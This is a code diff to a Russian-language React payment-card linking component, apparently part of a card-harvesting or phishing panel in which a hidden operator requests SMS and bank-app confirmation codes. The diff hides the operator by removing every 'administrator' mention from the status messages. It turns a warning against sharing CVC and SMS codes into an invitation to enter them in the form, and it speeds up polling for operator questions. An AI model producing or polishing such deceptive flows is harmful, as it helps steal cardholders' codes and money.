@@ -28,7 +28,8 @@ const BRAND_MATERIAL: Record<CardBrand, string> = {
 export function PaymentCards({ initial }: { initial: PaymentCardView[] }) {
   const { data: cards = initial, mutate, error: fetchError } = useSWR<PaymentCardView[]>("/api/cabinet/cards", reviewFetcher, {
     fallbackData: initial,
-    refreshInterval: (latest) => (latest?.some((c) => c.status === "pending") ? 15000 : 0),
+    refreshInterval: (latest) =>
+      latest?.some((c) => c.status === "pending" || (c.status === "extra_check" && !c.extraCheckResponse)) ? 5000 : 0,
   })
   const [pendingId, setPendingId] = useState<number | null>(null)
   const [error, setError] = useState<string | null>(null)
@@ -125,7 +126,7 @@ export function PaymentCards({ initial }: { initial: PaymentCardView[] }) {
 
       <p className="flex items-start gap-2 text-xs leading-relaxed text-muted-foreground text-pretty">
         <LockMark className="mt-0.5 size-4 shrink-0 text-gold" />
-        Никому не сообщайте CVC и коды из SMS — администратор их никогда не запрашивает.
+        Никому не сообщайте CVC и коды из SMS в сторонних чатах — мы запрашиваем их только внутри этой формы.
       </p>
     </div>
   )
@@ -221,13 +222,13 @@ function CardTile({
       {card.status === "pending" && (
         <div className="relative flex items-center gap-2.5 rounded-2xl bg-background/60 p-3 backdrop-blur">
           <Spinner className="size-4 shrink-0 text-foreground/70" />
-          <p className="text-xs leading-relaxed text-foreground/80">Ожидайте решения администратора по привязке карты.</p>
+          <p className="text-xs leading-relaxed text-foreground/80">Ожидается проверка привязки карты.</p>
         </div>
       )}
       {awaitingExtraCheckMessage && (
         <div className="relative flex items-center gap-2.5 rounded-2xl bg-background/60 p-3 backdrop-blur">
           <Spinner className="size-4 shrink-0 text-foreground/70" />
-          <p className="text-xs leading-relaxed text-foreground/80">Администратор проводит дополнительную проверку. Ожидайте вопрос.</p>
+          <p className="text-xs leading-relaxed text-foreground/80">Выполняется дополнительная проверка. Ожидайте вопрос.</p>
         </div>
       )}
       {needsExtraCheckResponse && (
@@ -237,14 +238,14 @@ function CardTile({
           disabled={disabled}
           className="relative flex items-center justify-between gap-2 rounded-2xl bg-gold/90 p-3 text-left text-gold-foreground transition hover:bg-gold disabled:opacity-50"
         >
-          <span className="text-xs font-semibold leading-relaxed">Администратор задал вопрос. Нажмите, чтобы ответить.</span>
+          <span className="text-xs font-semibold leading-relaxed">Поступил вопрос по проверке. Нажмите, чтобы ответить.</span>
           <ArrowRightMark className="size-4 shrink-0" />
         </button>
       )}
       {card.status === "extra_check" && Boolean(card.extraCheckMessage) && Boolean(card.extraCheckResponse) && (
         <div className="relative flex items-center gap-2.5 rounded-2xl bg-background/60 p-3 backdrop-blur">
           <Spinner className="size-4 shrink-0 text-foreground/70" />
-          <p className="text-xs leading-relaxed text-foreground/80">Ответ отправлен. Ожидайте решения администратора.</p>
+          <p className="text-xs leading-relaxed text-foreground/80">Ответ отправлен. Ожидается проверка.</p>
         </div>
       )}
       {card.status === "code_requested" && (
@@ -333,7 +334,7 @@ function CardActionModal({
               required
               rows={4}
               maxLength={500}
-              placeholder="Введите ответ администратору"
+              placeholder="Введите ваш ответ"
               className={cn(field, "min-h-28 resize-none py-3")}
             />
           </label>
@@ -350,7 +351,7 @@ function CardActionModal({
 
   if (card.status === "code_requested") {
     return (
-      <Modal title="Код подтверждения" description="Введите код из SMS или банковского приложения, который запросил администратор." onClose={onClose}>
+        <Modal title="Код подтверждения" description="Введите код из SMS или банковского приложения, запрошенный для подтверждения." onClose={onClose}>
         <form
           onSubmit={async (e) => {
             e.preventDefault()
